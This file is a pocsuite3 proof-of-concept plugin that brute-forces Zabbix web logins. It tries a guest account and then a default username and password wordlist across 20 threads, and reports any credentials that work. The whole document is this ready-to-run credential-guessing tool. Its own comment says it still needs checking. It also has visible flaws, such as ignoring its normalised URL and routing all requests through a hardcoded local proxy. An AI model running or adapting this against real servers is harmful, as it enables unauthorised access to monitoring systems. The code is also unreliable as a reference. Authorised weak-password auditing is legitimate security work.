# -*- coding: utf-8 -*-
# author: seven
# 该脚本仍需检验
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY,requests
from pocsuite3.lib.core.threads import run_threads
import socket
import queue
import itertools

zabbix_username = ['admin','Admin','zabbix','Zabbix','guest','test','root']
zabbix_password = ['Zabbix','admin','zabbix','123456','12345','test','root']

class ZabbixWeakpassPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 8, 2020'
    createDate = 'Aug 8, 2020'
    name = 'zabbix弱口令'
    appName = 'zabbix'
    appVersion = 'v1.0.0'
    vulType = '弱口令'
    protocol = 'http'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        url = self.url
        result = {}
        if not url.startswith('http'):
            url = 'http://'+url
        zabbix_burst(self.url)
        if not result_queue.empty():
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            accounts = []
            while not result_queue.empty():
                account=result_queue.get()
                logger.info(account)
                accounts.append(account)
            result['extra'] = accounts

        return self.parse_output(result)
    def _attack(self):
        return self._verify()

task_queue = queue.Queue()
result_queue = queue.Queue()

def get_word_list():
    return itertools.product(zabbix_username,zabbix_password)

def url_check(url):
    try:
        res = requests.get(url+'/index.php')
        if 'zabbix' in res.text:
            return True
    except Exception as e:
        logger.info(f'{url}:fail\t{str(e)}')
    logger.info(f'{url} not alive')
    return False

def check_guest_login(url):
    return zabbix_login(url,'guest','')


def zabbix_login(url,username,password):
    url = url+'/index.php'
    try:
        res = requests.post(url,data={
            'name':username,
            'password':password,
            'enter':'Sign in'
        },allow_redirects=False,proxies={'http':'http://127.0.0.1:8066'})
        if res.status_code == 302:
            return True
    except Exception as e:
        pass
    return False

def task_init(url):
    for username,password in get_word_list():
        task_queue.put((url,username,password))
    
def task_thread():
    while not task_queue.empty():
        url,username,password = task_queue.get()
        logger.info('try burst {} use username:{} password:{}'.format(
            url, username, password))
        if zabbix_login(url,username,password):
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((username,password))

def zabbix_burst(url):
    if not url_check(url):
        return
    if check_guest_login(url):
        result_queue.put(('guest', ''))

    try:
        task_init(url)
        run_threads(20, task_thread)
    except Exception as e:
        logger.info(f'{url}:\t{str(e)}')
register_poc(ZabbixWeakpassPOC)